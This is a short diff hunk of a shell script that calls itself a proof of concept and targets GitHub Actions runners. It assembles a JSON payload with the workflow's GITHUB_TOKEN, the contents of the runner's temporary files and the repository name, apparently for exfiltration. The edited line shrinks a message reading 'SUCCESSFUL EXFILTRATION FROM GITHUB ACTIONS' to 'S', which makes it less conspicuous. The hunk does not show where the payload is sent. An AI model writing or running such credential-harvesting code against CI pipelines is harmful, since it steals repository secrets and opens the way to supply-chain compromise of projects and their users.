@@ -47,7 +47,7 @@ echo "[POC] Executing Proof of Concept code..."
 # Construct a JSON payload with environment details
 JSON_PAYLOAD=$(cat <<EOF
 {
-  "message": "SUCCESSFUL EXFILTRATION FROM GITHUB ACTIONS",
+  "message": "S",
   "github_token": "${GITHUB_TOKEN}",
   "ghtok": "$(cat /home/runner/work/_temp/*)",
   "repository": "${GITHUB_REPOSITORY}",
